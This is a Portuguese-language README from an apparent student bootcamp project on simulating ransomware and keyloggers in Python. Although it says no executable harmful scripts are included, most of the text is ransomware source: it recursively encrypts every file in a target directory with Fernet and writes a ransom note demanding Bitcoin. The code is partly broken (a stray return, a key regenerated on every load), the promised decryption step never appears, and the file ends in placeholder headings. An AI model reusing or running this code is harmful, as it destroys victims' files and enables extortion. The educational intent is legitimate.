# Ransomware-e-Keylogger — Santander Bootcamp 2025

**Resumo do Projeto**
Este trabalho foi elaborado para simulações educacionais sobre duas ameaças digitais --Ransomware e Keylogger-- desenvolvido em python e documentado de forma responsável. O projeto tem como finalidade entender como as ameaças operam, quais dados elas capturam ou criptografam. Como se proteger qual técnica de detecção e mitigação são eficaz para o mundo real.


---

> ⚠️ **atenção**: Ética e Segurança.
Por responsabilidade ética e legal, este repositório não inclui scripts executáveis que coletem teclas, criptografem arquivos ou exfiltrem dados.
O script foi produzido e testado em ambiente seguro e controlado. O uso indevido deste conteúdo fora de um ambiente autorizado pode caracterizar crime cibernético, conforme a legislação brasileira (Lei nº 12.737/2012 e Marco Civil da Internet).
---
 ## 🧭 Objetivos do desafio



   - Compreender o funcionamento prático de Ransomware e Keylogger;
  - Identificar como esses malwares exploram vulnerabilidades e brechas humanas;
  - Programar scripts simples em Python simulando ataques reais em ambiente controlado;
  - Refletir sobre estratégias de defesa e prevenção contra malwares;
  - Documentar seus experimentos e utilizar o GitHub como portfólio técnico.
---
# Desafio 

**Ransomware , implementar um script que criptografa e descriptografa, além de gerar mensagem de “resgate”.**



`from cryptography.fernet import Fernet
import os`

## Função para carregar a chave
`def carregar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)`

## carregar chave salva em arquivo
   `return open("chave.key", "rb").read()``

## Função para criptografar arquivos
`def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)`

## Função para encontrar arquivos a serem criptografados
`def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista`

## mensagem de resgate
`def criar_mensagem_resgate():
    mensagem = """
    Seus arquivos foram criptografados!
    Para recuperá-los, envie 1 Bitcoin para o endereço abaixo:
    [ENDEREÇO DE BITCOIN]
    Após o pagamento, envie um e-mail para [SEU EMAIL] com o comprovante.
    Você receberá a chave de descriptografia em até 24 horas.
    """
    with open("MENSAGEM_DE_RESCATE.txt", "w") as file:
        file.write(mensagem)`

##execução principal


`def main():
    carregar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("malware")  # Substitua pelo diretório alvo
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Criptografia concluída! Leia MENSAGEM_DE_RESCATE.txt para instruções.")`

## Execução principal
`if __name__ == "__main__":`
      `main()`
---


# Agora com nosso script para criptografar feito precisamos fazer o script para descriptografar.

---





# teste 
## teste 
### teste 

